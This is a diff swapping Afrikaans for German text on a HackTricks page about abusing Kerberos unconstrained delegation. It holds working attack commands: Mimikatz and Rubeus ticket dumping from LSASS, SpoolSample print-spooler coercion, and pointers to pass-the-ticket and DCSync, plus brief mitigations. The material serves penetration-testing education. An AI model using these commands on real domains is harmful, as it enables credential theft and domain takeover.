@@ -17,63 +17,63 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## Unconstrained delegation
 
-Dit is 'n kenmerk wat 'n Domein Administrateur kan stel op enige **Rekenaar** binne die domein. Dan, wanneer 'n **gebruiker aanmeld** op die Rekenaar, sal 'n **kopie van die TGT** van daardie gebruiker **binne die TGS** wat deur die DC **gestuur word en in geheue in LSASS gestoor word**. So, as jy Administrateur regte op die masjien het, sal jy in staat wees om die **kaartjies te dump en die gebruikers te verpersoonlik** op enige masjien.
+Dies ist eine Funktion, die ein Domänenadministrator für jeden **Computer** innerhalb der Domäne festlegen kann. Jedes Mal, wenn sich ein **Benutzer** an dem Computer anmeldet, wird eine **Kopie des TGT** dieses Benutzers in das **TGS** gesendet, das vom DC bereitgestellt wird, **und im Speicher in LSASS gespeichert**. Wenn Sie also Administratorrechte auf der Maschine haben, können Sie die Tickets **dumpen und die Benutzer** auf jeder Maschine impersonieren.
 
-So as 'n domein admin aanmeld op 'n Rekenaar met die "Unconstrained Delegation" kenmerk geaktiveer, en jy het plaaslike admin regte op daardie masjien, sal jy in staat wees om die kaartjie te dump en die Domein Admin enige plek te verpersoonlik (domein privesc).
+Wenn sich ein Domänenadministrator an einem Computer mit aktivierter Funktion "Unconstrained Delegation" anmeldet und Sie lokale Administratorrechte auf dieser Maschine haben, können Sie das Ticket dumpen und den Domänenadministrator überall impersonieren (Domänenprivilegieneskalation).
 
-Jy kan **Rekenaar objek met hierdie attribuut vind** deur te kyk of die [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) attribuut [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) bevat. Jy kan dit doen met 'n LDAP filter van ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, wat is wat powerview doen:
+Sie können **Computerobjekte mit diesem Attribut finden**, indem Sie überprüfen, ob das Attribut [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) enthält. Sie können dies mit einem LDAP-Filter von ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ tun, was powerview macht:
 
 <pre class="language-bash"><code class="lang-bash"># List unconstrained computers
 ## Powerview
-Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
+Get-NetComputer -Unconstrained #DCs erscheinen immer, sind aber für privesc nicht nützlich
 <strong>## ADSearch
 </strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
 <strong># Export tickets with Mimikatz
 </strong>privilege::debug
-sekurlsa::tickets /export #Recommended way
-kerberos::list /export #Another way
+sekurlsa::tickets /export #Empfohlene Methode
+kerberos::list /export #Eine andere Methode
 
 # Monitor logins and export new tickets
-.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Check every 10s for new TGTs</code></pre>
+.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Überprüfen Sie alle 10s auf neue TGTs</code></pre>
 
-Laai die kaartjie van die Administrateur (of slagoffer gebruiker) in geheue met **Mimikatz** of **Rubeus vir 'n** [**Pass the Ticket**](pass-the-ticket.md)**.**\
-Meer inligting: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
-[**Meer inligting oor Unconstrained delegation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
+Laden Sie das Ticket des Administrators (oder des Opferbenutzers) mit **Mimikatz** oder **Rubeus für ein** [**Pass the Ticket**](pass-the-ticket.md)**.**\
+Weitere Informationen: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
+[**Weitere Informationen zur Unconstrained Delegation bei ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
 
 ### **Force Authentication**
 
-As 'n aanvaller in staat is om 'n **rekenaar wat toegelaat word vir "Unconstrained Delegation"** te **kompromitteer**, kan hy 'n **Druk bediener** **mislei** om **outomaties aan te meld** teen dit **en 'n TGT in die geheue van die bediener te stoor**.\
-Dan kan die aanvaller 'n **Pass the Ticket aanval uitvoer om** die gebruiker se Druk bediener rekenaarrekening te verpersoonlik.
+Wenn ein Angreifer in der Lage ist, einen Computer zu **kompromittieren, der für "Unconstrained Delegation" erlaubt ist**, könnte er einen **Druckserver** **täuschen**, um sich **automatisch** bei ihm **anzumelden und ein TGT** im Speicher des Servers zu speichern.\
+Dann könnte der Angreifer einen **Pass the Ticket-Angriff durchführen, um** das Benutzerkonto des Druckservers zu impersonieren.
 
-Om 'n druk bediener teen enige masjien aan te meld, kan jy [**SpoolSample**](https://github.com/leechristensen/SpoolSample) gebruik:
+Um einen Druckserver dazu zu bringen, sich an einer beliebigen Maschine anzumelden, können Sie [**SpoolSample**](https://github.com/leechristensen/SpoolSample) verwenden:
 ```bash
 .\SpoolSample.exe <printmachine> <unconstrinedmachine>
 ```
-If the TGT if from a domain controller, you could perform a[ **DCSync attack**](acl-persistence-abuse/#dcsync) and obtain all the hashes from the DC.\
-[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
+Wenn das TGT von einem Domänencontroller stammt, könnten Sie einen[ **DCSync-Angriff**](acl-persistence-abuse/#dcsync) durchführen und alle Hashes vom DC erhalten.\
+[**Weitere Informationen zu diesem Angriff auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
 
-**Hier is ander maniere om te probeer om 'n outentisering te dwing:**
+**Hier sind weitere Möglichkeiten, um eine Authentifizierung zu erzwingen:**
 
 {% content-ref url="printers-spooler-service-abuse.md" %}
 [printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
 {% endcontent-ref %}
 
-### Mitigering
+### Minderung
 
-* Beperk DA/Admin aanmeldings tot spesifieke dienste
-* Stel "Rekening is sensitief en kan nie gedelegeer word nie" vir bevoorregte rekeninge.
+* Begrenzen Sie DA/Admin-Anmeldungen auf bestimmte Dienste
+* Setzen Sie "Konto ist sensibel und kann nicht delegiert werden" für privilegierte Konten.
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
